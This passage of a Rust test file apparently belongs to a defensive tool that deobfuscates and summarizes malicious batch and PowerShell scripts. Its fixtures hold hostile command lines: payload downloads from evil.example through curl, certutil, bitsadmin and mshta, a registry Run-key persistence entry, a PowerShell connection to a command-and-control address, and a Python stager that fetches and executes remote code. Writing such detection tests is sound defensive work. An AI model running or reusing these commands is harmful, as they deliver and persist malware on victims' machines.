        "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
    )
    .expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["summarize", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
    assert!(
        v.get("deobfuscated_preview").is_none(),
        "summarize should not emit redundant deobfuscated preview: {v}"
    );
    assert!(!v["downloads"].as_array().expect("downloads").is_empty());
    assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
}

#[test]
fn summarize_tldr_emits_human_readable_ioc_lines() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("rev.ps1");
    fs::write(
        &input,
        r#"#powershell
$ipaddress = '203.0.113.45'
$dport = 4444
$client = New-Object System.Net.Sockets.TcpClient($ipaddress, $dport)
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["summarize", "--tldr", input.to_str().expect("path")])
        .output()
        .expect("run");

    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(
        s.contains("C2 connect") && s.contains("203.0.113.45:4444"),
        "tldr missing C2 connect: {s}"
    );
    assert!(
        serde_json::from_str::<serde_json::Value>(&s).is_err(),
        "tldr should be human-readable text, not JSON: {s}"
    );
}

#[test]
fn summarize_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "mshta http://evil.example/payload.hta\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
    assert_eq!(
        matches[0].get("lolbas_url").and_then(|v| v.as_str()),
        Some("https://lolbas-project.github.io/lolbas/Binaries/Mshta/")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.005")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_output_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "curl -o C:\\Users\\Public\\mshta.exe http://evil.example/payload.bin\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_powershell_outfile_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -NoProfile -Command "iwr http://evil.example/payload.bin -OutFile C:\Users\Public\mshta.exe""#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_positional_destination_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_matches_program_path_after_command_separator() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\payload.bin & C:\\Windows\\System32\\mshta.exe http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_non_exec_operands() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        concat!(
            "bitsadmin /transfer j http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
            "certutil -decode C:\\Users\\Public\\mshta.exe C:\\Users\\Public\\payload.bin\r\n",
            "msiexec /i C:\\Users\\Public\\setup.msi /L*v C:\\Users\\Public\\mshta.exe\r\n",
            "copy C:\\Users\\Public\\payload.bin C:\\Users\\Public\\mshta.exe\r\n",
            "curl http://evil.example/payload.bin, C:\\Users\\Public\\mshta.exe\r\n",
        ),
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn analyze_recurses_into_echoed_encoded_powershell_batch() {
    use base64::Engine;

    let decoded = "Invoke-WebRequest -Uri https://recursive.example/m2.zip";
    let utf16: Vec<u8> = decoded
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        format!(
            "@echo off\r\necho @echo off>hidden.bat\r\necho Powershell -NoProfile -Encoded {b64}>>hidden.bat\r\n"
        ),
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("https://recursive.example/m2.zip"),
        "stdout:\n{}",
        stdout
    );
}

#[test]
fn analyze_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "rundll32 url.dll,FileProtocolHandler http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Rundll32.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.011"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Rundll32.exe")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.011")
    );
}

#[test]
fn analyze_env_option_unlocks_powershell_env_payload() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("child.cmd.txt");
    fs::write(
        &input,
        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--env",
            "HARRINGTON_STAGE=Invoke-WebRequest https://cli-env.example/payload.exe -OutFile payload.exe",
            input.to_str().expect("path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");

    assert!(
        json["traits"].as_array().expect("traits").iter().any(|t| t
            .to_string()
            .contains("https://cli-env.example/payload.exe")),
        "--env did not unlock env-backed PowerShell payload:\n{}",
        String::from_utf8_lossy(&out)
    );
}

#[test]
fn analyze_env_file_unlocks_powershell_env_payload() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("child.cmd.txt");
    let env_file = dir.path().join("sandbox.env");
    fs::write(
        &input,
        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
    )
    .expect("write");
    fs::write(
        &env_file,
        "\n# copied sandbox env\nHARRINGTON_STAGE=Invoke-WebRequest https://cli-env-file.example/payload.exe -OutFile payload.exe\n",
    )
    .expect("write env");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--env-file",
            env_file.to_str().expect("env path"),
            input.to_str().expect("path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");

    assert!(
        json["traits"].as_array().expect("traits").iter().any(|t| t
            .to_string()
            .contains("https://cli-env-file.example/payload.exe")),
        "--env-file did not unlock env-backed PowerShell payload:\n{}",
        String::from_utf8_lossy(&out)
    );
}

#[test]
fn analyze_env_file_accepts_multiline_values() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("child.cmd.txt");
    let env_file = dir.path().join("sandbox.env");
    fs::write(
        &input,
        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
    )
    .expect("write");
    fs::write(
        &env_file,
        "HARRINGTON_STAGE=$u='https://cli-env-multiline.example/payload.exe'\n$ignored = 'kept inside same value'\nInvoke-WebRequest $u -OutFile payload.exe\n",
    )
    .expect("write env");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--env-file",
            env_file.to_str().expect("env path"),
            input.to_str().expect("path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");

    assert!(
        json["traits"].as_array().expect("traits").iter().any(|t| t
            .to_string()
            .contains("https://cli-env-multiline.example/payload.exe")),
        "--env-file multiline value did not unlock env-backed PowerShell payload:\n{}",
        String::from_utf8_lossy(&out)
    );
}

#[test]
fn analyze_env_option_requires_assignment() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("child.cmd.txt");
    fs::write(&input, "echo hi\r\n").expect("write");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--env",
            "HARRINGTON_STAGE",
            input.to_str().expect("path"),
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("expected NAME=VALUE"));
}

#[test]
fn bare_file_argument_defaults_to_analyze_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.ps1");
    fs::write(
        &input,
        "Invoke-WebRequest -Uri https://bare-file.example/payload.ps1",
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .arg(input.to_str().expect("path"))
        .output()
        .expect("run");

    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert_eq!(
        v["extracted"]["powershell"].as_u64().unwrap_or_default(),
        1,
        "bare path should be analyzed as standalone PowerShell: {v}"
    );
}

#[test]
fn analyze_json_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host analyze-json";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert!(
        v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from analyze JSON: {v}"
    );
    assert!(
        v["extracted"].get("powershell_samples").is_none(),
        "preview field should not be present in default summary JSON: {v}"
    );
    assert_eq!(v["recovered"]["pe"].as_u64(), Some(0));
}

#[test]
fn report_writes_tail_base64_python_payload_as_script_artifact() {
    use base64::Engine;

    let payload = format!(
        "import requests, zlib\n\
         junk = '{}'\n\
         exec(requests.get('https://tail-b64-python-cli.example/stage.py').text)\n\
         exec(__import__('marshal').loads(zlib.decompress(__import__('base64').b85decode(junk))))\n",
        "$".repeat(8_000)
    );
    let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        format!("@echo off\r\npowershell -NoP -C \"iex tail-loader\"\r\n{b64}\r\n"),
    )
    .expect("write");
    let out_dir = dir.path().join("out");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "report",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    let recovered = v["output_files"]["recovered"]
        .as_array()
        .expect("recovered files");
    let py = recovered
        .iter()
        .find(|file| {
            file["origin"]
                .as_str()
                .is_some_and(|origin| origin.starts_with("tail-base64-python"))
        })
        .expect("tail-base64-python artifact");

    assert_eq!(py["kind"].as_str(), Some("script"), "{py:#}");
    assert_eq!(py["format"].as_str(), Some("py"), "{py:#}");
    assert!(
        py["name"]
            .as_str()
            .is_some_and(|name| name.ends_with(".py")),
        "{py:#}"
    );
    let artifact_path = py["path"].as_str().expect("artifact path");
    let artifact = fs::read_to_string(artifact_path).expect("read artifact");
    assert!(
        artifact.contains("tail-b64-python-cli.example/stage.py"),
        "{artifact}"
    );
}

#[test]
fn deob_json_only_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host deob-json";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["deob", input.to_str().expect("path"), "--json-only"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert!(
        v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from deob JSON: {v}"
    );
    assert_eq!(v["recovered"]["pe"].as_u64(), Some(0));
}

#[test]
fn analyze_jsonl_meta_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host meta";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let first_line = String::from_utf8_lossy(&out.stdout)
        .lines()
        .next()
        .expect("meta line")
        .to_string();
    let meta: serde_json::Value = serde_json::from_str(&first_line).expect("meta json");
    assert_eq!(meta["kind"], "meta");
    assert!(
        meta["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from meta: {meta}"
    );
    assert_eq!(meta["extracted"]["cmd"].as_u64(), Some(0));
    assert_eq!(meta["extracted"]["jscript"].as_u64(), Some(0));
    assert_eq!(meta["extracted"]["vbs"].as_u64(), Some(0));
    assert_eq!(meta["recovered"]["pe"].as_u64(), Some(0));
}

#[test]
fn analyze_jsonl_accepts_multiple_input_files() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    fs::write(&first, "curl http://one.example/a\r\n").expect("write first");
    fs::write(&second, "curl http://two.example/b\r\n").expect("write second");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            first.to_str().expect("first path"),
            second.to_str().expect("second path"),
            "--jsonl",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
        .collect();
    let metas: Vec<_> = lines
        .iter()
        .filter(|line| line["kind"] == "meta")
        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
        .collect();
    assert_eq!(
        metas,
        vec![
            first.to_string_lossy().to_string(),
            second.to_string_lossy().to_string()
        ]
    );
    assert!(
        lines
            .iter()
            .any(|line| line.to_string().contains("one.example"))
            && lines
                .iter()
                .any(|line| line.to_string().contains("two.example")),
        "missing one of the expected URL traits: {lines:#?}"
    );
}

#[test]
fn analyze_multiple_input_files_requires_jsonl() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    fs::write(&first, "echo one\r\n").expect("write first");
    fs::write(&second, "echo two\r\n").expect("write second");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            first.to_str().expect("first path"),
            second.to_str().expect("second path"),
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "multiple analyze inputs require --jsonl",
        ));
}

#[test]
fn analyze_jsonl_accepts_file_list() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    let list = dir.path().join("inputs.txt");
    fs::write(&first, "curl http://list-one.example/a\r\n").expect("write first");
    fs::write(&second, "curl http://list-two.example/b\r\n").expect("write second");
    fs::write(
        &list,
        format!("{}\n{}\n\n", first.display(), second.display()),
    )
    .expect("write list");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--file-list",
            list.to_str().expect("list path"),
            "--jsonl",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
        .collect();
    let metas: Vec<_> = lines
        .iter()
        .filter(|line| line["kind"] == "meta")
        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
        .collect();
    assert_eq!(
        metas,
        vec![
            first.to_string_lossy().to_string(),
            second.to_string_lossy().to_string()
        ]
    );
    assert!(
        lines
            .iter()
            .any(|line| line.to_string().contains("list-one.example"))
            && lines
                .iter()
                .any(|line| line.to_string().contains("list-two.example")),
        "missing one of the expected URL traits: {lines:#?}"
    );
}

#[test]
fn analyze_file_list_requires_jsonl() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    let list = dir.path().join("inputs.txt");
    fs::write(&input, "echo hi\r\n").expect("write input");
    fs::write(&list, format!("{}\n", input.display())).expect("write list");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", "--file-list", list.to_str().expect("list path")])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "analyze --file-list requires --jsonl",
        ));
}

#[test]
fn analyze_file_list_is_size_capped() {
    let dir = TempDir::new().expect("tmp");
    let list = dir.path().join("inputs.txt");
    fs::write(&list, "x".repeat(16 * 1024 * 1024 + 1)).expect("write list");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            "--file-list",
            list.to_str().expect("list path"),
            "--jsonl",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("file list"))
        .stderr(predicates::str::contains("exceeds"));
}

#[test]
fn analyze_can_emit_drive_profile_to_stderr() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .env("HARRINGTON_PROFILE_DRIVE", "1")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .assert()
        .success()
        .stderr(predicates::str::contains("harrington_profile_drive"))
        .stderr(predicates::str::contains("fast_expand_ms="));
}

#[test]
fn analyze_can_emit_final_profile_to_stderr() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "echo powershell -Command [Reflection.Assembly]::Load($b)\r\n",
    )
    .expect("write");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .env("HARRINGTON_PROFILE_FINAL", "1")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .assert()
        .success()
        .stderr(predicates::str::contains("harrington_profile_final"));
}

#[cfg(unix)]
#[test]
fn analyze_jsonl_handles_closed_stdout_without_panic() {
    use std::io::{BufRead, BufReader};
    use std::process::{Command as StdCommand, Stdio};

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    let mut body = String::new();
    for i in 0..200_000 {
        body.push_str(&format!(
            "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{i:06}\r\n"
        ));
    }
    fs::write(&input, body).expect("write");

    let bin = assert_cmd::cargo::cargo_bin("batdeob");
    let mut child = StdCommand::new(bin)
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn");

    let stdout = child.stdout.take().expect("stdout");
    let mut reader = BufReader::new(stdout);
    let mut first_line = String::new();
    reader.read_line(&mut first_line).expect("read first line");
    assert!(
        first_line.contains(r#""kind":"meta""#),
        "line: {first_line}"
    );
    drop(reader);

    let output = child.wait_with_output().expect("wait");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success(),
        "closed stdout should exit cleanly, status={:?}, stderr:\n{}",
        output.status,
        stderr
    );
    assert!(
        !stderr.contains("panicked") && !stderr.contains("Broken pipe"),
        "closed stdout produced panic-like stderr:\n{}",
        stderr
    );
}
